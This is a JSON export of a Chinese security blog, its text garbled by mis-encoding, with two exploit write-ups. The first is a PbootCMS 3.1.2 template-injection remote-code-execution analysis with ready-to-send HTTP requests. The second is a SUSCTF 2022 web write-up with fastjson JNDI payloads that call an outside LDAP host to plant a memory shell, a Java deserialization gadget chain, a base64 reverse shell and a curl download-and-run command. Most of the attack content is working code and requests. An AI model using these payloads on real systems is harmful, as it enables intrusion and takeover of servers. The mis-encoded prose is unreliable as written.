{"pages":[{"title":"about","text":"è¿™é‡Œæ²¡æœ‰é«˜æ·±çš„çŸ¥è¯†ï¼Œåªæœ‰é›¶æ•£çš„ç¬”è®°ï¼Œæˆ–æ˜¯ç›´æ¥æ‘˜æŠ„ï¼Œæˆ–æ˜¯ç®€å•æ€»ç»“ï¼Œåªä¸ºåœ¨æˆ‘ã€Œæš‚æ—¶å¤±å¿†ã€æ—¶ï¼Œå¸®è‡ªå·±åº¦è¿‡éš¾å…³ï¼Œå¦‚æœèƒ½å¸®åŠ©åˆ°ä½ æˆ‘ä¼šæ„Ÿåˆ°å¾ˆé«˜å…´ã€‚ å…³äºæˆ‘ ID: suanve ID: è¯·å¦¹å­ä¸è¦æŠŠå’–å•¡æ³¼åœ¨æˆ‘çš„macbookä¸Š çƒ­è¡·äºCTF,èµ›åœºä¸Šçœ‹åˆ°suanveå°±æ˜¯æˆ‘å•¦.","link":"/about/index.html"}],"posts":[{"title":"pboot cms V3.1.2 &quot;è™šå‡çš„æ— æ–‡ä»¶è½åœ°RCE&quot;","text":"Auth: EDIå®‰å…¨/suanve 0 å‰è¨€ä¸Šæ¬¡ç”µè„‘é€ä¿®æˆ‘å°±ä¹°äº†ä¸ªmini ä¸€ç›´ç”¨macmini ç»“æœ æœ¬å­ä¿®å¥½ä»¥åæ‹¿å›æ¥ä¹Ÿå¿˜äº†çœ‹ è‹¹æœå”®åæŠŠæˆ‘ç³»ç»Ÿåˆ†åŒºé‡è£…äº† å¯¼è‡´æ²¡æœ‰phpç¯å¢ƒ brewåœ¨macos 12ä¸Šä¹Ÿä¸èƒ½æ­£å¸¸å·¥ä½œ è¿™å°±ç›´æ¥å¯¼è‡´è¥¿æ¹–æ¯”èµ›çš„æ—¶å€™æˆ‘vardumpè°ƒè¯•ä¹Ÿæ²¡è°ƒå‡ºä¸ªæ‰€ä»¥ç„¶ï¼ˆè¿˜è¢«å¤§ä½¬å–· ï¼ˆç¡®å® æŒºç®€å•çš„ä¸€ä¸ªæ¼æ´ ä»Šå¤©å›XXä»¥å è°ƒè¯•äº†ä¸€ä¸‹ 1 åˆ†ææ ¹æ®å†å²æ¼æ´å¯ä»¥çŸ¥é“åœ¨å‰å° æœ‰ä¸€ä¸ª ssti æœç´¢evalå¯ä»¥æ‰¾åˆ°eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}'); evalå‡ºè‡ªparserIfLabelå‡½æ•° æ‰¾parserIfLabelè°ƒç”¨å¯ä»¥æ‰¾åˆ°parserAfter æ‰¾parserAfterè°ƒç”¨å¯ä»¥æ‰¾åˆ°SearchController-index åœ¨parserAfterå‡½æ•°ä¸­ å¯ä»¥çœ‹åˆ°è·å–äº†keywordå…³é”®å­— ï¼ˆæœ‰çš„åˆå­¦è€…å¯èƒ½å°±è§‰å¾—é—®é¢˜å‡ºç°åœ¨è¿™é‡Œäº† æˆ‘æ¯”èµ›çš„æ—¶å€™ä¹Ÿæ˜¯çŠ¯äº†è¿™ä¸ªé”™è¯¯ å®é™…ä¸Šè¿™é‡Œçš„é€»è¾‘å†™çš„æŒºå¥½çš„ å–å‚çš„æ—¶å€™ ä¼šé€šè¿‡æ­£åˆ™æ¥æ ¡éªŒè¾“å…¥ å¦‚æœä¸ç¬¦åˆå°±æŠŠä¼ å…¥çš„æ•°æ®ç½®ç©º æ¶æ„æ“ä½œåŸºæœ¬è¿›ä¸å» ï¼ˆä½†æ˜¯ã€‚ã€‚ã€‚å¼€å‘è€…åœ¨åŠ è½½æ¨¡æ¿çš„æ—¶å€™ å…¶å®å·²ç»æŠŠæˆ‘ä»¬çš„payloadæ”¾å…¥$contentäº†æ‰€ä»¥geté‡Œçš„é™åˆ¶å°±é™åˆ¶äº†ä¸ªå¯‚å¯ å¼€å§‹åˆ†æ å…ˆæŠŠpayloadå¸¦è¿›å» åœ¨åˆšåŠ è½½ï¼ˆæ¸²æŸ“ï¼‰å®Œæ¨¡æ¿çš„æ—¶å€™ å¯ä»¥çœ‹åˆ°å·²ç»æŠŠæ¶æ„è¯­å¥åŠ è½½è¿›æ¥äº† æ‰€ä»¥ä»–çš„getå‡½æ•°ä¸­å‡ ä¸ªé™åˆ¶å®Œå…¨æ²¡èµ·åˆ°ä½œç”¨ï¼ˆå…¶å®æ¼æ´ç‚¹ä¸åœ¨keywordå…³é”®å­— åé¢ä¼šè¯¦ç»†è¯´ å¯ä»¥çœ‹åˆ° getæ–¹æ³•å†…åˆ°å„ç§é™åˆ¶æ“ä½œ ç¡®å®æŠŠä¸ç¬¦åˆè§„åˆ™çš„keywordç»™ç½®nulläº† ä½†æ˜¯å…¶å®contenté‡Œçš„è¿˜åœ¨ æ‰€ä»¥è¿™é‡Œè·Ÿè¿›çœ‹ä¸€ä¸‹æœ€åˆå§‹çš„æ¸²æŸ“æ¨¡æ¿éƒ¨åˆ† é¦–å…ˆåœ¨è¿™é‡Œæ˜¯åŠ è½½æ¨¡æ¿ æ¸²æŸ“åŸºç¡€éƒ¨åˆ†ç”Ÿæˆç¼“å­˜ ç„¶ååŒ…å«ç¼“å­˜å åœ¨è¿™é‡Œå‘ç°äº† echo URL; è¿™é‡Œä¿å­˜çš„è¿˜æ˜¯å®Œæ•´url é—®é¢˜å°±æ˜¯å‡ºåœ¨è¿™é‡Œäº† ç»§ç»­å¾€ä¸‹çœ‹ å¯ä»¥çœ‹åˆ°$content = ob_get_contents(); è¡Œå§ ç›´æ¥æŠŠurlè¾“å‡ºç„¶åä¿å­˜åˆ°$contenté‡Œäº†ã€‚ å³ä½¿ä¸‹é¢ä»–å¤šæ¬¡è·å–keywordæ—¶è¯•å›¾ä¸æŠŠè¿è§„å­—ç¬¦å¸¦å…¥æ¨¡æ¿ éƒ½æ²¡æœ‰ä¸€ç‚¹æ„ä¹‰ ç»†å¿ƒçš„å°ä¼™ä¼´å¯èƒ½å‘ç°äº† è¿™ä¸ªé—®é¢˜å¥½åƒæ˜¯å‡ºåœ¨äºŒç»´ç ç”Ÿæˆæ ‡ç­¾è¿™ä¸ªä½ç½®çš„ è€Œåœ¨è¿›å…¥æˆ‘ä»¬å…³é”®ç‚¹ä¹‹å‰ å°±æœ‰è¿™ä¹ˆä¸€æ¬¡æ“ä½œ è·Ÿè¿›å»çœ‹ä¸€çœ¼ å—¯ ä»–åŒ¹é…äº†æˆ‘ä»¬äºŒç»´ç è¿™ä¸ªæ ‡ç­¾çš„å†…å®¹ ç„¶åå°†å…¶ç”ŸæˆäºŒç»´ç é“¾æ¥ ï¼ˆæ‰€ä»¥å¤§å®¶çŸ¥é“äº†å§ æ¼æ´å®é™…ä¸Šå‡ºåœ¨ä»–å¯¹æ¨¡æ¿çš„æ¸²æŸ“éƒ¨åˆ†ä¸Š è¿™å°±å¯¼è‡´æ‰€æœ‰å’Œæ¨¡æ¿æ¸²æŸ“çš„åœ°æ–¹ éƒ½ä¼šå­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼ˆå…¶å®å°±æ˜¯åªè¦æœ‰äºŒç»´ç åˆ†äº«çš„é¡µé¢ éƒ½å¯ä»¥è§¦å‘æˆ‘ä»¬åé¢çš„payload æ‰€ä»¥æˆ‘ä»¬æƒ³åˆ©ç”¨è¿™é‡Œçš„è¯ åªéœ€è¦é’ˆå¯¹ä¸Šé¢çš„æ­£åˆ™/\\{pboot:qrcode(\\s+[^}]+)?\\}/åšæ–‡ç« å°±å¥½äº† æˆ‘ä»¬æå–å‡ºå…³é”®çš„è¿™ä¸€è¡Œhtml å‘ç°ä¼šè¢«å®Œæ•´çš„åŒ¹é…åˆ° ç»“åˆæ­£åˆ™å¾ˆå®¹æ˜“ç†è§£ æ‹¬å·æˆå¯¹å˜› æ‰€ä»¥æˆ‘ä»¬ç»™ä»–åŠ ä¸€ä¸ª}ä»–ä¸å°±åŒ¹é…ä¸åˆ°æˆ‘ä»¬çš„payloadäº† è‡³æ­¤ æˆ‘ä»¬å·²ç»å®Œæ•´çš„è§£å†³äº†{}å¸¦å…¥æ¨¡æ¿çš„é—®é¢˜ æ¥ä¸‹æ¥å°±ç›´æ¥æŠŠç»è¿‡å„ç§æ“ä½œçš„$contentå¸¦åˆ°äº†parserIfLabel å‡½æ•° ä¹Ÿå°±æ˜¯å­˜åœ¨evalçš„åœ°æ–¹ ç™¾åº¦æ‰¾æ‰¾å†å²æ–‡ç« åˆ†æå°±çŸ¥é“æ— éå°±æ˜¯ç»•é‚£å‡ ä¸ªæ­£åˆ™ (æ¨èä¸€ä¸ªç½‘ç«™ https://regex101.com/ æŒºå¥½ç”¨çš„ ç‰µæ‰¯åˆ°ä¹‹è¯¥cmsä¹‹å‰çš„å‡ ä¸ªæ¼æ´ æˆ‘ä»¬å¯ä»¥çŸ¥é“å®Œæˆä»¥ä¸‹ä¸¤ç‚¹å³å¯å®ç°rce ç»•è¿‡å‡½æ•°æ‰§è¡Œæ­£åˆ™ ç»•è¿‡å‚æ•°æ­£åˆ™ ä¸€ä¸ªä¸ªæ¥ ç»•è¿‡å‡½æ•°æ‰§è¡Œæ­£åˆ™è¯´å‡ ä¸ªçŸ¥è¯†ç‚¹ å¤§å®¶éƒ½æ‡‚å¾— 12345func(1);func (1);func/**/(1);func (1); pbootcmsçš„å‡½æ•°æ‰§è¡Œæ£€æµ‹æ­£åˆ™é•¿è¿™æ · ([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\&lt;\\&gt;\\%\\w\\s\\\\\\\\]+)?\\( å¤§æ¦‚äº†è§£ä¸€ä¸‹ä»¥å å—¯ã€‚ã€‚ã€‚è¿˜æƒ³å•¥ ç›´æ¥fuzzå°±å¥½å•¦ ï¼Ÿï¼Ÿ å’‹å››ç§éƒ½ä¸è¡Œ ä½†æ˜¯å¤§å®¶åˆ«å¿˜äº†å•Š ç¬¬ä¸‰ç§æœ‰æ³¨é‡Šå•Š/**/ ä½ åªåŒ¹é…([\\w+])é‚£æˆ‘åŠ ä¸€ä¸ª-ä½ è¿˜èƒ½åŒ¹é…åˆ°å—ï¼Ÿä½ åŒ¹é…ä¸åˆ°äº†å§ã€‚ ç»•è¿‡å‚æ•°è·å–çš„æ­£åˆ™è¿™é‡Œæˆ‘æ²¡æœ‰è¯¦ç»†çš„å»ç ”ç©¶æ€ä¹ˆç»•å…³é”®å­—æ„ä¹‰ä¸å¤§ æ¯•ç«Ÿæ˜¯ctfer ç”¨ç‚¹ ctfæŠ€å·§å°±æ´¾ä¸Šç”¨åœºäº†ï¼ˆç½‘ä¸Šçš„æ¼æ´åˆ†ææœ‰ä¸¤ä¸ªå…³é”®å‡½æ•° å¯ä»¥ç›´æ¥ç”¨ get_lgå’Œget_backurl ä»–ä¿©éƒ½åœ¨function.php get_lg æ˜¯ä» cookie lgå­—æ®µå– 12345678910// è·å–å½“å‰è¯­è¨€å¹¶è¿›è¡Œå®‰å…¨å¤„ç†Ã…function get_lg(){ $lg = cookie('lg'); if (! $lg || ! preg_match('/^[\\w\\-]+$/', $lg)) { $lg = get_default_lg(); cookie('lg', $lg); } return $lg;} get_backurlä»getå– 12345678910111213// è·å–è¿”å›URLfunction get_backurl(){ if (! ! $backurl = get('backurl')) { if (isset($_SERVER[&quot;QUERY_STRING&quot;]) &amp;&amp; ! ! get('p')) { return &quot;&amp;backurl=&quot; . $backurl; } else { return &quot;?backurl=&quot; . $backurl; } } else { return; }} æ‰€ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•° æ­é…å‡½æ•°æ‰§è¡Œæ–¹å¼ å°±èƒ½ç»•è¿‡æ­£åˆ™ 2 åˆ©ç”¨:123456789101112131415161718192021GET /index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 ä»»æ„é¡µé¢çš†å¯rceæ ¹æ®åˆšåˆšæ‰€è¯´çš„ ä»–å®é™…ä¸Šä¸æ˜¯searchæ§åˆ¶å™¨çš„é—®é¢˜æ‰€ä»¥ä»»æ„é¡µé¢éƒ½å¯ä»¥è°ƒç”¨ 123456789101112131415161718192021GET /index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 123456789101112131415161718192021GET /?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 æ¼æ´çš„æŒ–æ˜å¤§å¤šæ•°éƒ½æ˜¯ç«™åœ¨å‰äººçš„è‚©è†€ä¸Š æˆ‘ä¹Ÿä¸ä¾‹å¤– è¿™æ ·ä¸€ä¸ªè°ƒä¸€è°ƒå°±å‡ºæ¥äº†çš„æ´ å¤§å®¶åº”è¯¥éƒ½æœ‰ å…¬å¼€ä¹Ÿæ²¡ä»€ä¹ˆä¸å¥½ x æœ‰å…³è¥¿æ¹–è®ºå‰‘ctfæœ‰disablefunctionå’Œopenbasedir php7.2å¼€å§‹å¼ƒç”¨äº†create_functionä½†æ˜¯æ²¡ç§»é™¤ è¿˜æ˜¯å¯ä»¥ç”¨çš„ æ‰€ä»¥è°ƒç”¨ https://github.com/mm0r1/exploits/tree/master/php-filter-bypass â€œpwnâ€ä¸€ä¸‹å°±å¥½äº† æ¬¢è¿å…³æ³¨â€EDIå®‰å…¨â€","link":"/2021/11/22/pboot-cms-V3-1-2-%E8%99%9A%E5%81%87%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0RCE/"},{"title":"SUSCTF2022-web-writeup","text":"Auth: EDISEC Teamæœ¬åœºæ¯”èµ›å¯è°“æ˜¯â€éé¢„æœŸçš„éé¢„æœŸæ¬¡æ–¹â€ fxxkcors123456789fxxkcorschallenge:http://124.71.205.122:10002/report:http://123.60.71.144:3000/fxxkcorshttp://159.138.56.26:3000/fxxkcorshttp://119.13.125.234:3000/fxxkcors åº”è¯¥æ˜¯è¦ç»•CORS è®©BOTä¿®æ”¹æˆ‘çš„ç”¨æˆ·ä¸ºadmin Originæ— æ•ˆ æ²¡æ‰¾åˆ°æœ‰xss å†™ POSTå‘json è®©BOTæ‰“ä¹Ÿæ²¡ä¿®æ”¹æˆåŠŸ æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ã€‚ã€‚ã€‚ 1234567891011BOTç‰¹å¾connect to [10.7.100.194] from ecs-119-13-125-234.compute.hwclouds-dns.com [119.13.125.234] 37878GET / HTTP/1.1Host: 36.255.221.156:902Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/99.0.4844.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US è¹­è½¦å‡ºäº†ï¼ˆçœŸçš„æ˜¯ç¬‘æ­» å…±äº«ç¯å¢ƒå°±è¿™ç‚¹ä¸å¥½ baby gadget v1.0123baby gadget v1.0bypass and bypasshttp://124.71.187.127:20012/ bpç»•è¿‡é‡å®šå‘ å¯ä»¥å‘ç°admin/download.jsp ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªä¾èµ–åŒ… fastjson ç›®å½•æ‰«æï¼Œè®¿é—®åˆ°admin/è·¯ç”± ä¼šè‡ªåŠ¨é‡å®šå‘ å¼±å¯†ç ç™»å½• admin admin123 fastjsonè§¦å‘ç‚¹ 123456789101112131415161718192021222324252627POST /admin/mailbox.jsp HTTP/1.1Host: 124.71.187.127:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 272Origin: http://124.71.187.127:20012Connection: closeReferer: http://124.71.187.127:20012/admin/mailbox.jsp?q=123123123Cookie: JSESSIONID=197ACA802BB2F2298D4CA7DDA7154D85Upgrade-Insecure-Requests: 1Origin: foo.example.orginputtext={ &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://1.116.218.142:9999/Object&quot;, &quot;autoCommit&quot;:true }} å¯èƒ½éœ€è¦æ ¹æ®é‚£ä¸ªlib æŒ–é“¾å­ ä½†æ˜¯æˆ‘é€‰æ‹©æ‘†çƒ‚ å·¥å…·æ¢­å“ˆ å†™ä¸ªå†…å­˜é©¬ ç„¶å{cat,flag} ç»•è¿‡raspæ£€æµ‹ 1234567891011121314151617181920212223242526POST /admin/mailbox.jsp HTTP/1.1Host: 124.71.187.127:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 294Origin: http://124.71.187.127:20013eConnection: closeReferer: http://124.71.187.127:20013/admin/mailbox.jsp?q=123123123Cookie: JSESSIONID=09C31AC61C1C265773A55D835D085415Upgrade-Insecure-Requests: 1Origin: foo.example.orginputtext={ &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://1.116.218.142:1389/TomcatBypass/TomcatMemshell&quot;, &quot;autoCommit&quot;:true }} åç»­æŸ¥çœ‹ä¾èµ– baby gadget v1.0â€™s rrrevengefastjsonå˜ä¸º1.2.48ï¼Œå…¶ä»–æ²¡å˜ï¼Œæ”¹ä¸€ä¸‹payload {â€œ@typeâ€:â€org.apache.xbean.propertyeditor.JndiConverterâ€,â€AsTextâ€:â€ldap://xx.xx.xx.xx:7771/Exploitâ€} æˆåŠŸè®¿é—®ç±»ï¼Œä½†æ²¡æœ‰å¼¹å›æ¥shellï¼Œè·Ÿç€ä¸Šé¢˜çš„æ€è·¯ï¼ŒåŒæ ·å†™ä¸ªå†…å­˜é©¬å°±å®Œäº‹äº† {â€œ@typeâ€:â€org.apache.xbean.propertyeditor.JndiConverterâ€,â€AsTextâ€:â€ldap://xx.xx.xx.xx:7771/SRainâ€} æŠ“ä¸€ä¸‹flag baby gadget v2.0ç™»å½•æ˜¯ä¸ªXML çŒœæµ‹XXE ä¸ç¬¦åˆxmlæ ‡å‡†çˆ†å‡º Get out hacker! æç¤ºäº†hint.txt å°è¯•dtd+æ— å›æ˜¾ è¯»å–åˆ°hintï¼Œä¸‹è½½å‹ç¼©åŒ… æœ‰wafé™åˆ¶ http://124.71.189.248:20012/bf2dcf6664b16e0efe471b2eac2b54b2 ä½†æ˜¯è¿˜æ˜¯çŸ¥é“äº†æ˜¯ç›´æ¥bodyååºåˆ—åŒ– è¯•äº†ä¸€æ™šä¸Š ä½¿ç”¨å…¶ä»–Classç»•è¿‡HashMapå°±å¯ä»¥äº† pocå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.apache.commons.collections.Bag;import org.apache.commons.collections.FastHashMap;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bag.HashBag;import org.apache.commons.collections.bag.TransformedBag;import org.apache.commons.collections.bag.TransformedSortedBag;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.*;/** * @author MoonBack * @date 2022/2/27 16:07 */public class susctf { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{ ClassPool.getDefault().get(evil.class.getName()).toBytecode() }); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { obj }) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map hashMap = new TreeMap(); // æ„é€ å‡ºæ¶æ„Map Map evilMap = LazyMap.decorate(hashMap, chainedTransformer); // ç”¨æ¶æ„Mapåˆå§‹åŒ–TiedMapEntryç±» TiedMapEntry tiedMapEntry = new TiedMapEntry(evilMap, &quot;key&quot;); // å°†æ„é€ å¥½çš„TiedMapEntryå¯¹è±¡ä½œä¸ºHashMapçš„ä¸€ä¸ªkey Map evalMap = new FastHashMap(); // putçš„æ—¶å€™ä¼šè§¦å‘Mapï¼škeyçš„getæ–¹æ³•ï¼Œæ‰€ä»¥å…ˆæ„é€ ä¸€ä¸ªæ— å®³çš„ChainedTransformerå¯¹è±¡ç”¨æ¥åˆå§‹åŒ–ï¼Œä¹‹åå†ç”¨åå°„ä¿®æ”¹å€¼ evalMap.put(tiedMapEntry, &quot;123&quot;); // æ³¨æ„è¿™é‡Œ evilMap.remove(&quot;key&quot;); // ç”¨åå°„è®¾ç½®æŠŠæ¶æ„æ„é€ çš„Transformer Field declaredFields = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); // è®¾ç½®æƒé™ declaredFields.setAccessible(true); declaredFields.set(chainedTransformer, transformers); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(evalMap); oos.close(); System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray()))); // æœ¬åœ°æµ‹è¯•è§¦å‘// System.out.println(barr);// ObjectInputStream ois = new SafeInputStream(new ByteArrayInputStream(barr.toByteArray()));// Object o = (Object) ois.readObject(); }} åå¼¹shellæ˜¯å¤±è´¥çš„ã€‚ã€‚ã€‚æ‰€ä»¥å…ˆcurlå†™æ–‡ä»¶ ç„¶åå†æ‰§è¡Œå®ƒ é€šè¿‡curlæŠŠflagå¸¦å‡ºæ¥ 123456789101112131415161718192021222324/** * @author MoonBack * @date 2021/12/15 15:00 */import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class evil extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public evil() throws Exception {// Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zNi4yNTUuMjIxLjE1Ni85ODAxIDA+JjE=}|{base64,-d}|{bash,-i}&quot;);// Runtime.getRuntime().exec(&quot;curl -o /tmp/suanve http://36.255.221.156:901/1 &quot;); Runtime.getRuntime().exec(&quot;bash /tmp/suanve&quot;);// Runtime.getRuntime().exec(&quot;calc&quot;); }} 1 ä¸‹è½½æ–‡ä»¶ 1234567891011121314POST /bf2dcf6664b16e0efe471b2eac2b54b2 HTTP/1.1Host: 124.71.189.248:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1cmd: idOrigin: foo.example.orgContent-Type: application/x-www-form-urlencodedContent-Length: 3830rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuRmFzdEhhc2hNYXDPVCYVgxGIjgIAAloABGZhc3RMAANtYXB0ABNMamF2YS91dGlsL0hhc2hNYXA7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AHNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2tleXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAZ4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vb